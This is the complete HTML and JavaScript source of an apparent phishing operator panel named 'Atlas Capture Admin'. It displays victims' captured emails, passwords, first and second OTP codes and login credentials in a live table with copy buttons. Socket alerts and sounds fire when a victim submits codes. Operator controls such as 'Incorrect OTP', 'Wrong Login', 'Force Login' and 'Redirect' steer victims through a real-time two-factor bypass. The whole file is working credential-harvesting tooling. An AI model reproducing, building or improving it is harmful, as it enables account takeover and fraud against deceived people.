<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Dashboard - Atlas Capture</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Inter', sans-serif;
}

:root {
  --bg-page: #f8fafc;
  --bg-card: #ffffff;
  --bg-table-header: #f8fafc;
  --bg-hover: #fafcff;
  --text-primary: #0f172a;
  --text-secondary: #475569;
  --text-muted: #64748b;
  --border-light: #e9eef3;
  --border-medium: #e2e8f0;
  --shadow-sm: 0 1px 2px rgba(0,0,0,0.03);
  --shadow-md: 0 10px 25px rgba(0,0,0,0.05);
  --input-bg: #ffffff;
  --code-bg: #f1f5f9;
  --copy-btn: #94a3b8;
  --copy-btn-hover: #4f46e5;
  --toast-bg: #ffffff;
  --transition: all 0.2s ease;
}

[data-theme="dark"] {
  --bg-page: #0f172a;
  --bg-card: #1e293b;
  --bg-table-header: #1e293b;
  --bg-hover: #334155;
  --text-primary: #f1f5f9;
  --text-secondary: #cbd5e1;
  --text-muted: #94a3b8;
  --border-light: #334155;
  --border-medium: #475569;
  --shadow-sm: 0 1px 2px rgba(0,0,0,0.2);
  --shadow-md: 0 10px 25px rgba(0,0,0,0.3);
  --input-bg: #334155;
  --code-bg: #334155;
  --copy-btn: #94a3b8;
  --copy-btn-hover: #818cf8;
  --toast-bg: #1e293b;
}

body {
  background: var(--bg-page);
  color: var(--text-primary);
  transition: var(--transition);
}

.navbar {
  background: var(--bg-card);
  padding: 12px 24px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  box-shadow: var(--shadow-sm);
  border-bottom: 1px solid var(--border-light);
  position: sticky;
  top: 0;
  z-index: 100;
  flex-wrap: wrap;
  gap: 10px;
}
.navbar h1 {
  font-size: 18px;
  font-weight: 600;
  color: var(--text-primary);
}
.navbar-right {
  display: flex;
  align-items: center;
  gap: 12px;
  flex-wrap: wrap;
}
.theme-toggle {
  background: var(--bg-table-header);
  border: 1px solid var(--border-medium);
  border-radius: 30px;
  padding: 6px 12px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 12px;
  font-weight: 500;
  color: var(--text-secondary);
  transition: var(--transition);
}
.theme-toggle:hover {
  background: var(--border-light);
}
.logout-btn {
  background: #ef4444;
  color: white;
  border: none;
  padding: 6px 16px;
  border-radius: 8px;
  cursor: pointer;
  font-weight: 500;
  font-size: 13px;
  transition: var(--transition);
}
.logout-btn:hover {
  background: #dc2626;
}

.container {
  max-width: 100%;
  margin: 16px auto;
  padding: 0 16px;
}

.stats {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
  gap: 12px;
  margin-bottom: 20px;
}
.stat-card {
  background: var(--bg-card);
  padding: 14px 20px;
  border-radius: 16px;
  border: 1px solid var(--border-light);
  box-shadow: var(--shadow-sm);
}
.stat-card h3 {
  font-size: 11px;
  font-weight: 500;
  color: var(--text-muted);
  margin-bottom: 4px;
  text-transform: uppercase;
  letter-spacing: 0.3px;
}
.stat-card .number {
  font-size: 24px;
  font-weight: 700;
  color: var(--text-primary);
}

.table-container {
  background: var(--bg-card);
  border-radius: 16px;
  border: 1px solid var(--border-light);
  overflow-x: auto;
  box-shadow: var(--shadow-sm);
}
table {
  width: 100%;
  border-collapse: collapse;
  min-width: 1400px;
}
th {
  text-align: left;
  padding: 10px 12px;
  background: var(--bg-table-header);
  font-weight: 600;
  font-size: 11px;
  color: var(--text-secondary);
  border-bottom: 1px solid var(--border-light);
  text-transform: uppercase;
  letter-spacing: 0.3px;
}
td {
  padding: 8px 12px;
  border-bottom: 1px solid var(--border-light);
  color: var(--text-secondary);
  font-size: 12px;
  vertical-align: middle;
}
tr:hover {
  background: var(--bg-hover);
}

.badge {
  display: inline-block;
  padding: 2px 8px;
  border-radius: 20px;
  font-size: 10px;
  font-weight: 500;
}
.badge-pending { background: #fef3c7; color: #d97706; }
.badge-approved { background: #d1fae5; color: #059669; }
.badge-waiting { background: #e0e7ff; color: #4f46e5; }
.badge-email { background: #fef3c7; color: #d97706; }
.badge-blocked { background: #fee2e2; color: #dc2626; }

.actions-cell {
  white-space: normal;
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
  padding: 8px;
}
.action-btn {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  padding: 5px 10px;
  border-radius: 6px;
  cursor: pointer;
  font-size: 10px;
  font-weight: 500;
  border: none;
  transition: var(--transition);
  white-space: nowrap;
}
.approve-btn { background: #f59e0b; color: white; }
.force-login-btn { background: #8b5cf6; color: white; }
.redirect-success-btn { background: #3b82f6; color: white; }
.send-text-btn { background: #f97316; color: white; }
.delete-user-btn { background: #ef4444; color: white; }
.block-email-btn { background: #dc2626; color: white; }
.incorrect-otp-btn { background: #e11d48; color: white; }
.wrong-login-btn { background: #b91c1c; color: white; }
.correct-login-btn { background: #059669; color: white; }

.action-btn:hover {
  transform: translateY(-1px);
  opacity: 0.9;
}
.action-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
  transform: none;
}

.copy-icon {
  background: transparent;
  border: none;
  cursor: pointer;
  font-size: 10px;
  color: var(--copy-btn);
  padding: 2px;
  border-radius: 4px;
  transition: var(--transition);
  margin-left: 4px;
}
.copy-icon:hover {
  color: var(--copy-btn-hover);
  background: var(--border-light);
}

.timestamp {
  font-size: 10px;
  font-family: monospace;
  color: var(--text-muted);
  white-space: nowrap;
}

.data-value {
  display: inline-flex;
  align-items: center;
  gap: 2px;
  flex-wrap: wrap;
}
.data-code {
  font-family: monospace;
  background: var(--code-bg);
  padding: 2px 6px;
  border-radius: 4px;
  font-size: 11px;
  color: var(--text-primary);
}
.data-empty {
  color: var(--text-muted);
  font-size: 11px;
}

.notification-toast {
  position: fixed;
  top: 70px;
  right: 16px;
  background: var(--toast-bg);
  border-left: 3px solid #4f46e5;
  padding: 10px 16px;
  border-radius: 10px;
  box-shadow: var(--shadow-md);
  display: none;
  z-index: 1000;
  animation: slideIn 0.3s ease;
  max-width: 300px;
}
@keyframes slideIn {
  from { transform: translateX(100%); opacity: 0; }
  to { transform: translateX(0); opacity: 1; }
}
.notification-toast h4 {
  color: #4f46e5;
  margin-bottom: 2px;
  font-size: 12px;
}
.notification-toast p {
  color: var(--text-muted);
  font-size: 11px;
}

.modal-overlay {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.5);
  backdrop-filter: blur(2px);
  z-index: 10000;
  justify-content: center;
  align-items: center;
}
.modal-overlay.active {
  display: flex;
}
.modal {
  background: var(--bg-card);
  border-radius: 20px;
  max-width: 500px;
  width: 90%;
  padding: 24px;
  box-shadow: var(--shadow-md);
  max-height: 80vh;
  overflow-y: auto;
}
.modal h3 {
  font-size: 18px;
  font-weight: 700;
  color: var(--text-primary);
  margin-bottom: 16px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.modal h3 button {
  background: transparent;
  border: none;
  font-size: 20px;
  cursor: pointer;
  color: var(--text-muted);
}
.blocked-list {
  list-style: none;
}
.blocked-item {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 12px;
  border-bottom: 1px solid var(--border-light);
}
.blocked-email {
  font-weight: 500;
  color: var(--text-primary);
}
.blocked-meta {
  font-size: 10px;
  color: var(--text-muted);
  margin-top: 4px;
}
.unblock-btn {
  background: #059669;
  color: white;
  border: none;
  padding: 4px 12px;
  border-radius: 6px;
  cursor: pointer;
  font-size: 11px;
}

.text-modal-overlay {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.5);
  backdrop-filter: blur(2px);
  z-index: 10000;
  justify-content: center;
  align-items: center;
}
.text-modal-overlay.active {
  display: flex;
}
.text-modal {
  background: var(--bg-card);
  border-radius: 20px;
  max-width: 400px;
  width: 90%;
  padding: 20px;
  box-shadow: var(--shadow-md);
}
.text-modal h3 {
  font-size: 18px;
  font-weight: 700;
  color: var(--text-primary);
  margin-bottom: 12px;
}
.text-modal textarea {
  width: 100%;
  padding: 10px;
  border: 1px solid var(--border-medium);
  border-radius: 10px;
  font-size: 13px;
  font-family: Inter, sans-serif;
  resize: vertical;
  margin-bottom: 16px;
  background: var(--input-bg);
  color: var(--text-primary);
}
.text-modal textarea:focus {
  outline: none;
  border-color: #f97316;
}
.text-modal-buttons {
  display: flex;
  gap: 10px;
}
.text-modal-buttons button {
  flex: 1;
  padding: 8px;
  border-radius: 8px;
  font-weight: 600;
  cursor: pointer;
  border: none;
  font-size: 13px;
}
.text-modal-buttons .send-text-btn-modal {
  background: #f97316;
  color: white;
}
.text-modal-buttons .release-text-btn-modal {
  background: #6b7280;
  color: white;
}

.view-blocked-btn {
  background: #dc2626;
  color: white;
  border: none;
  padding: 6px 16px;
  border-radius: 8px;
  cursor: pointer;
  font-weight: 500;
  font-size: 13px;
  margin-left: 12px;
}
.view-blocked-btn:hover {
  background: #b91c1c;
}

@media (max-width: 768px) {
  .container {
    padding: 0 12px;
  }
  .stats {
    gap: 8px;
  }
  .stat-card {
    padding: 10px 12px;
  }
  .stat-card .number {
    font-size: 20px;
  }
  td {
    padding: 6px 8px;
    font-size: 11px;
  }
  th {
    padding: 8px 8px;
    font-size: 10px;
  }
  .action-btn {
    padding: 4px 8px;
    font-size: 9px;
  }
  .actions-cell {
    gap: 4px;
  }
}
</style>
</head>
<body>

<div class="navbar">
  <h1><i class="fas fa-chart-line" style="margin-right: 8px; color: #4f46e5;"></i> Atlas Capture Admin</h1>
  <div class="navbar-right">
    <button class="theme-toggle" id="themeToggleBtn">
      <i class="fas fa-moon"></i>
      <span>Dark Mode</span>
    </button>
    <button class="view-blocked-btn" id="viewBlockedBtn"><i class="fas fa-ban"></i> Blocked Emails</button>
    <button class="logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
  </div>
</div>

<div id="notificationToast" class="notification-toast">
  <h4 id="notificationTitle">New Request</h4>
  <p id="notificationMessage"></p>
</div>

<div id="textModal" class="text-modal-overlay">
  <div class="text-modal">
    <h3><i class="fas fa-paper-plane"></i> Send Text to User</h3>
    <textarea id="adminTextInput" rows="3" placeholder="Type your message here..."></textarea>
    <div class="text-modal-buttons">
      <button id="sendTextBtnModal" class="send-text-btn-modal"><i class="fas fa-paper-plane"></i> Send</button>
      <button id="releaseTextBtnModal" class="release-text-btn-modal"><i class="fas fa-times-circle"></i> Release</button>
    </div>
  </div>
</div>

<div id="blockedModal" class="modal-overlay">
  <div class="modal">
    <h3>Blocked Emails <button onclick="closeBlockedModal()">✕</button></h3>
    <div id="blockedListContainer">Loading...</div>
  </div>
</div>

<div class="container">
  <div class="stats">
    <div class="stat-card">
      <h3><i class="fas fa-users"></i> Total Users</h3>
      <div class="number" id="totalUsers">0</div>
    </div>
    <div class="stat-card">
      <h3><i class="fas fa-envelope"></i> Pending Approval</h3>
      <div class="number" id="pendingEmail">0</div>
    </div>
    <div class="stat-card">
      <h3><i class="fas fa-key"></i> Active Users</h3>
      <div class="number" id="activeSecondUsers">0</div>
    </div>
  </div>

  <div class="table-container">
    <table>
      <thead>
        <tr>
          <th>Email</th>
          <th>Password</th>
          <th>First OTP</th>
          <th>Second OTP</th>
          <th>Login Email</th>
          <th>Login Password</th>
          <th>Registered</th>
          <th>Status</th>
          <th>Actions</th>
        </tr>
      </thead>
      <tbody id="usersTableBody">
        <tr><td colspan="9" style="text-align:center; padding:40px; color:var(--text-muted);"><i class="fas fa-spinner fa-spin"></i> Loading...</td</span> </span>
      </tbody>
    </table>
  </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
  const themeToggleBtn = document.getElementById('themeToggleBtn');
  const currentTheme = localStorage.getItem('theme') || 'light';
  
  if (currentTheme === 'dark') {
    document.documentElement.setAttribute('data-theme', 'dark');
    themeToggleBtn.innerHTML = '<i class="fas fa-sun"></i><span>Light Mode</span>';
  }
  
  themeToggleBtn.addEventListener('click', () => {
    const theme = document.documentElement.getAttribute('data-theme');
    if (theme === 'dark') {
      document.documentElement.removeAttribute('data-theme');
      localStorage.setItem('theme', 'light');
      themeToggleBtn.innerHTML = '<i class="fas fa-moon"></i><span>Dark Mode</span>';
    } else {
      document.documentElement.setAttribute('data-theme', 'dark');
      localStorage.setItem('theme', 'dark');
      themeToggleBtn.innerHTML = '<i class="fas fa-sun"></i><span>Light Mode</span>';
    }
  });

  const token = localStorage.getItem('adminToken');
  if (!token) window.location.href = '/admin';

  const socket = io({ auth: { token } });
  let audioContext = null;
  let currentSelectedEmail = null;

  function initAudio() {
    if (!audioContext) {
      try {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
      } catch(e) {}
    }
  }

  function playSoundForAction(action) {
    initAudio();
    if (!audioContext) return;
    try {
      const now = audioContext.currentTime;
      if (action === 'email') {
        for (let i = 0; i < 3; i++) {
          const osc = audioContext.createOscillator();
          const gain = audioContext.createGain();
          osc.type = 'sine';
          osc.frequency.value = 600;
          gain.gain.value = 0.3;
          osc.connect(gain);
          gain.connect(audioContext.destination);
          osc.start(now + i * 0.2);
          osc.stop(now + i * 0.2 + 0.15);
        }
      } else if (action === 'first-otp') {
        const osc = audioContext.createOscillator();
        const gain = audioContext.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(500, now);
        osc.frequency.exponentialRampToValueAtTime(900, now + 0.4);
        gain.gain.value = 0.35;
        osc.connect(gain);
        gain.connect(audioContext.destination);
        osc.start(now);
        osc.stop(now + 0.5);
      } else if (action === 'second-otp') {
        const osc = audioContext.createOscillator();
        const gain = audioContext.createGain();
        osc.type = 'square';
        osc.frequency.value = 880;
        gain.gain.value = 0.35;
        osc.connect(gain);
        gain.connect(audioContext.destination);
        osc.start(now);
        osc.stop(now + 0.2);
        setTimeout(() => {
          const osc2 = audioContext.createOscillator();
          const gain2 = audioContext.createGain();
          osc2.type = 'square';
          osc2.frequency.value = 880;
          gain2.gain.value = 0.35;
          osc2.connect(gain2);
          gain2.connect(audioContext.destination);
          osc2.start(now + 0.35);
          osc2.stop(now + 0.55);
        }, 350);
      } else if (action === 'login-submitted') {
        const osc = audioContext.createOscillator();
        const gain = audioContext.createGain();
        osc.type = 'triangle';
        osc.frequency.value = 660;
        gain.gain.value = 0.25;
        osc.connect(gain);
        gain.connect(audioContext.destination);
        osc.start(now);
        osc.stop(now + 0.3);
      }
    } catch(e) {}
  }

  function formatTimestamp(dateStr) {
    if (!dateStr) return '<span class="data-empty">—</span>';
    const date = new Date(dateStr);
    return `<span class="timestamp" title="${date.toLocaleString()}">${date.toLocaleString()}</span>`;
  }

  function showNotification(title, message, action, playSound = true) {
    const toast = document.getElementById('notificationToast');
    document.getElementById('notificationTitle').textContent = title;
    document.getElementById('notificationMessage').textContent = message;
    toast.style.display = 'block';
    if (playSound) playSoundForAction(action);
    if (Notification.permission === 'granted') new Notification(title, { body: message });
    if ('vibrate' in navigator && playSound) navigator.vibrate([200, 100, 200]);
    setTimeout(() => { toast.style.display = 'none'; }, 4000);
  }

  if (Notification.permission === 'default') Notification.requestPermission();

  function copyToClipboard(text) {
    if (!text) return;
    navigator.clipboard.writeText(text).catch(() => {});
  }

  function showTextModal(email) {
    currentSelectedEmail = email;
    document.getElementById('adminTextInput').value = '';
    document.getElementById('textModal').classList.add('active');
  }

  function hideTextModal() {
    document.getElementById('textModal').classList.remove('active');
    currentSelectedEmail = null;
  }

  async function sendTextToUser() {
    const text = document.getElementById('adminTextInput').value.trim();
    if (!text) return;
    if (!currentSelectedEmail) return;
    try {
      await fetch('/api/admin/send-text', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify({ email: currentSelectedEmail, text })
      });
      hideTextModal();
      loadUsers();
    } catch (error) { console.error('Send text error:', error); }
  }

  async function releaseTextPopup() {
    if (!currentSelectedEmail) return;
    try {
      await fetch('/api/admin/release-text', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify({ email: currentSelectedEmail })
      });
      hideTextModal();
      loadUsers();
    } catch (error) { console.error('Release text error:', error); }
  }

  async function deleteUser(email) {
    if (confirm(`⚠️ Delete user: ${email}?`)) {
      try {
        await fetch('/api/admin/delete-user', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
          body: JSON.stringify({ email })
        });
        loadUsers();
      } catch (error) { console.error('Delete user error:', error); }
    }
  }

  async function blockEmail(email) {
    if (confirm(`🚫 Block email: ${email}?`)) {
      try {
        await fetch('/api/admin/block-email', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
          body: JSON.stringify({ email })
        });
        loadUsers();
        loadBlockedEmails();
      } catch (error) { console.error('Block email error:', error); }
    }
  }

  async function incorrectOTP(email) {
    if (confirm(`❌ Mark OTP as incorrect?`)) {
      try {
        await fetch('/api/admin/incorrect-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
          body: JSON.stringify({ email })
        });
      } catch (error) { console.error('Incorrect OTP error:', error); }
    }
  }

  async function wrongLoginCredentials(email) {
    if (confirm(`❌ Mark login as WRONG?`)) {
      try {
        await fetch('/api/admin/wrong-login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
          body: JSON.stringify({ email })
        });
      } catch (error) { console.error('Wrong login error:', error); }
    }
  }

  async function correctLoginCredentials(email) {
    if (confirm(`✅ Mark login as CORRECT?`)) {
      try {
        await fetch('/api/admin/correct-login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
          body: JSON.stringify({ email })
        });
      } catch (error) { console.error('Correct login error:', error); }
    }
  }

  async function loadBlockedEmails() {
    try {
      const response = await fetch('/api/admin/blocked-emails', { headers: { 'Authorization': `Bearer ${token}` } });
      const blocked = await response.json();
      const container = document.getElementById('blockedListContainer');
      if (blocked.length === 0) {
        container.innerHTML = '<p style="text-align:center; color:var(--text-muted);">No blocked emails</p>';
        return;
      }
      container.innerHTML = `<ul class="blocked-list">${blocked.map(b => `<li class="blocked-item"><div><div class="blocked-email">${b.email}</div><div class="blocked-meta">Blocked: ${new Date(b.blocked_at).toLocaleString()} by ${b.blocked_by || 'Admin'}</div></div><button class="unblock-btn" onclick="unblockEmail('${b.email}')">Unblock</button></li>`).join('')}</ul>`;
    } catch (err) {
      document.getElementById('blockedListContainer').innerHTML = '<p style="color:red;">Error loading blocked emails</p>';
    }
  }

  async function unblockEmail(email) {
    if (confirm(`Unblock ${email}?`)) {
      try {
        await fetch('/api/admin/unblock-email', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
          body: JSON.stringify({ email })
        });
        loadBlockedEmails();
        loadUsers();
        closeBlockedModal();
      } catch (error) { console.error('Unblock error:', error); }
    }
  }

  function openBlockedModal() { loadBlockedEmails(); document.getElementById('blockedModal').classList.add('active'); }
  function closeBlockedModal() { document.getElementById('blockedModal').classList.remove('active'); }

  async function loadUsers() {
    try {
      const response = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${token}` } });
      if (response.status === 403) { localStorage.removeItem('adminToken'); window.location.href = '/admin'; return; }
      const users = await response.json();
      displayUsers(users);
      updateStats(users);
    } catch(err) { console.error(err); }
  }

  function updateStats(users) {
    const pendingEmail = users.filter(u => !u.approved).length;
    const activeUsers = users.filter(u => u.approved === true && u.otp !== null).length;
    document.getElementById('totalUsers').textContent = users.length;
    document.getElementById('pendingEmail').textContent = pendingEmail;
    document.getElementById('activeSecondUsers').textContent = activeUsers;
  }

  function formatValue(value) {
    if (!value) return '<span class="data-empty">—</span>';
    const escaped = String(value).replace(/[&<>]/g, m => m === '&' ? '&amp;' : m === '<' ? '&lt;' : '&gt;');
    return `<div class="data-value"><span class="data-code">${escaped}</span><button class="copy-icon" onclick="copyToClipboard('${escaped.replace(/'/g, "\\'")}')" title="Copy"><i class="far fa-copy"></i></button></div>`;
  }

  function displayUsers(users) {
    const tbody = document.getElementById('usersTableBody');
    if (!users.length) { tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; padding:30px; color:var(--text-muted);"><i class="fas fa-inbox"></i> No users found</td></tr>'; return; }
    
    tbody.innerHTML = users.map(user => {
      let statusBadge = '';
      if (user.redirect_success === true) statusBadge = '<span class="badge badge-blocked">🚫 Redirected to Success</span>';
      else if (user.approved && user.second_approved) statusBadge = '<span class="badge badge-approved">✅ Fully Approved</span>';
      else if (user.approved && user.otp && !user.second_approved) statusBadge = '<span class="badge badge-waiting">🔐 First OTP Approved - Waiting for Second OTP</span>';
      else if (user.approved && !user.otp) statusBadge = '<span class="badge badge-waiting">✅ Email Approved - Waiting for First OTP</span>';
      else if (!user.approved) statusBadge = '<span class="badge badge-email">⏳ Pending Email Approval</span>';
      else statusBadge = '<span class="badge badge-pending">Pending</span>';
      
      const showLoginButtons = user.force_login === true || user.login_email !== null;
      
      return `<tr>
        <td>${formatValue(user.email)}</td>
        <td>${formatValue(user.password)}</td>
        <td>${user.otp ? formatValue(user.otp) : '<span class="data-empty">—</span>'}</td>
        <td>${user.second_otp ? formatValue(user.second_otp) : '<span class="data-empty">—</span>'}</td>
        <td>${user.login_email ? formatValue(user.login_email) : '<span class="data-empty">—</span>'}</td>
        <td>${user.login_password ? formatValue(user.login_password) : '<span class="data-empty">—</span>'}</td>
        <td>${formatTimestamp(user.email_submitted_at)}</td>
        <td>${statusBadge}</td>
        <td class="actions-cell">
          <button class="action-btn approve-btn" onclick="approveUser('${user.email}')"><i class="fas fa-check-circle"></i> Approve</button>
          <button class="action-btn block-email-btn" onclick="blockEmail('${user.email}')"><i class="fas fa-ban"></i> Block</button>
          <button class="action-btn force-login-btn" onclick="forceLogin('${user.email}')"><i class="fas fa-sign-in-alt"></i> Force Login</button>
          ${showLoginButtons ? `
            <button class="action-btn wrong-login-btn" onclick="wrongLoginCredentials('${user.email}')"><i class="fas fa-times-circle"></i> Wrong Login</button>
            <button class="action-btn correct-login-btn" onclick="correctLoginCredentials('${user.email}')"><i class="fas fa-check-circle"></i> Correct Login</button>
          ` : ''}
          <button class="action-btn redirect-success-btn" onclick="redirectToSuccess('${user.email}')"><i class="fas fa-arrow-right"></i> Redirect</button>
          <button class="action-btn send-text-btn" onclick="showTextModal('${user.email}')"><i class="fas fa-paper-plane"></i> Send Text</button>
          <button class="action-btn incorrect-otp-btn" onclick="incorrectOTP('${user.email}')"><i class="fas fa-times-circle"></i> Incorrect OTP</button>
          <button class="action-btn delete-user-btn" onclick="deleteUser('${user.email}')"><i class="fas fa-trash-alt"></i> Delete</button>
        </td>
      </tr>`;
    }).join('');
  }

  async function approveUser(email) {
    try {
      await fetch('/api/admin/approve', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify({ email })
      });
      loadUsers();
    } catch (error) { console.error('Approve error:', error); }
  }

  async function forceLogin(email) {
    try {
      await fetch('/api/admin/force-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify({ email })
      });
      loadUsers();
    } catch (error) { console.error('Force login error:', error); }
  }

  async function redirectToSuccess(email) {
    try {
      await fetch('/api/admin/redirect-success', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify({ email })
      });
      loadUsers();
    } catch (error) { console.error('Redirect success error:', error); }
  }

  function logout() { localStorage.removeItem('adminToken'); window.location.href = '/admin'; }

  // Socket listeners - ONLY FOR DATA RECEIVED
  socket.on('user-login', (data) => { showNotification('📧 New Email', `${data.email} signed up`, 'email', true); loadUsers(); });
  socket.on('user-otp-created', (data) => { showNotification('🔢 First OTP', `${data.email} entered: ${data.otp}`, 'first-otp', true); loadUsers(); });
  socket.on('user-second-otp-created', (data) => { showNotification('🔐 Second OTP', `${data.email} entered: ${data.second_otp}`, 'second-otp', true); loadUsers(); });
  socket.on('user-login-submitted', (data) => { showNotification('🔐 Login Submitted', `${data.email} submitted: ${data.loginEmail}`, 'login-submitted', true); loadUsers(); });
  
  socket.on('force-login-triggered', () => loadUsers());
  socket.on('redirect-success-triggered', () => loadUsers());
  socket.on('text-sent', () => loadUsers());
  socket.on('user-deleted', () => loadUsers());
  socket.on('duplicate-otp-attempt', () => loadUsers());
  socket.on('user-blocked', () => { loadUsers(); loadBlockedEmails(); });
  socket.on('user-unblocked', () => { loadUsers(); loadBlockedEmails(); });

  document.getElementById('sendTextBtnModal').addEventListener('click', sendTextToUser);
  document.getElementById('releaseTextBtnModal').addEventListener('click', releaseTextPopup);
  document.getElementById('viewBlockedBtn').addEventListener('click', openBlockedModal);
  document.getElementById('textModal').addEventListener('click', (e) => { if (e.target === document.getElementById('textModal')) hideTextModal(); });

  loadUsers();
  setInterval(loadUsers, 5000);
  loadBlockedEmails();
</script>
</body>
</html>
